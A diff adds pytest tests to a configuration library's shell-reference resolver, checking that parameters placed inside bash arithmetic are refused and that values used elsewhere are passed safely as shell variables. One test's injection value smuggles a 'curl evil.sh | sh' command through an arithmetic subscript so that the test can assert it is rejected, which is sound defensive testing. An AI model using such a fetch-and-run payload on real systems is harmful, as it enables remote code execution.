@@ -1,6 +1,8 @@
 """Tests for the reference language: the whole of it, and nothing more."""
 
+import subprocess
 from datetime import UTC, datetime
+from typing import cast
 
 import pytest
 
@@ -201,6 +203,76 @@ def test_the_quoting_a_reference_lands_in_is_read_through_escapes_and_nesting() 
     }
     for command, expected in commands.items():
         assert resolve_config({"command": command}, scope, shell_fields={"command"})["command"] == expected
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo $(( ${params.x} + 1 ))",
+        'echo $(( "${params.x}" + 1 ))',
+        "echo $(( (1 + (${params.x})) * 2 ))",
+        "(( ${params.x} > 1 ))",
+        "echo $[ ${params.x} + 1 ]",
+        'echo "total: $(( ${params.x} ))"',
+        "echo $(( $(( ${params.x} )) ))",
+    ],
+)
+def test_a_reference_in_shell_arithmetic_refuses_what_a_shell_would_evaluate(command: str) -> None:
+    """Bash evaluates a value in arithmetic, and a subscript in it runs a command."""
+    scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
+    with pytest.raises(UnknownReference, match="shell arithmetic"):
+        resolve_config({"command": command}, scope, shell_fields={"command"})
+
+
+@pytest.mark.parametrize("value", [3, -3, "3", "-3"])
+def test_a_reference_in_shell_arithmetic_resolves_to_an_integer(value: int | str) -> None:
+    """The form stays usable, and bare, because dash refuses a quote inside arithmetic."""
+    scope = ReferenceScope(params={"x": value})
+    resolved = resolve_config({"command": "echo $(( ${params.x} + 1 ))"}, scope, shell_fields={"command"})
+    assert resolved["command"] == "echo $(( $DIRIGENT_V0 + 1 ))"
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": str(value)}
+
+
+def test_quotes_the_author_wrote_inside_arithmetic_stay_theirs() -> None:
+    """A reference takes none of its own there, and what was typed is left as typed."""
+    scope = ReferenceScope(params={"x": 3})
+    resolved = resolve_config({"command": 'echo $(( "${params.x}" + 1 ))'}, scope, shell_fields={"command"})
+    assert resolved["command"] == 'echo $(( "$DIRIGENT_V0" + 1 ))'
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("echo $(( 1 + 1 )) ${params.x}", 'echo $(( 1 + 1 )) "$DIRIGENT_V0"'),
+        ("echo $(( (1 + 1) )) ${params.x}", 'echo $(( (1 + 1) )) "$DIRIGENT_V0"'),
+        ("echo $[ 1 + 1 ] ${params.x}", 'echo $[ 1 + 1 ] "$DIRIGENT_V0"'),
+        ("(( 1 > 0 )) && echo ${params.x}", '(( 1 > 0 )) && echo "$DIRIGENT_V0"'),
+        ("echo $(( $(cat ${params.x}) + 1 ))", 'echo $(( $(cat "$DIRIGENT_V0") + 1 ))'),
+        ("echo $(cat ${params.x})", 'echo $(cat "$DIRIGENT_V0")'),
+        ("(cd /tmp; echo ${params.x})", '(cd /tmp; echo "$DIRIGENT_V0")'),
+        ("echo '$(( ' ${params.x}", "echo '$(( ' \"$DIRIGENT_V0\""),
+    ],
+)
+def test_a_reference_beside_shell_arithmetic_takes_any_value(command: str, expected: str) -> None:
+    """Only arithmetic itself is held to an integer: a value elsewhere is never re-read."""
+    scope = ReferenceScope(params={"x": "a b"})
+    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
+    assert resolved["command"] == expected
+    assert resolved["shell_variables"] == {"DIRIGENT_V0": "a b"}
+
+
+def test_a_rewritten_arithmetic_command_runs_in_the_shell_a_command_is_handed_to() -> None:
+    """The bare spelling is what makes it valid in dash as well as in bash."""
+    resolved = resolve_config(
+        {"command": "echo $(( ${params.x} + ${params.x} ))"},
+        ReferenceScope(params={"x": 20}),
+        shell_fields={"command"},
+    )
+    variables = cast("dict[str, str]", resolved["shell_variables"])
+    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
+        ["/bin/sh", "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
+    )
+    assert finished.stdout == b"40\n"
 
 
 def test_each_reference_in_a_command_gets_a_variable_of_its_own() -> None:
